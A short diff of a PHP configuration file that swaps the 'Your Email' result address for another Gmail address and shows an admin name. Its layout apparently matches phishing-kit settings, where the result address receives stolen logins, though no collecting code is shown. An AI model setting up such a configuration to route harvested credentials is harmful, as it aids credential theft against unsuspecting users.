@@ -1,6 +1,6 @@
 <?php
 //-----------Your Email
-$result = "resultniod@gmail.com";
+$result = "muhammadsairi519@gmail.com";
 
 //-----------Your ADMINname
 $name = "admin7";
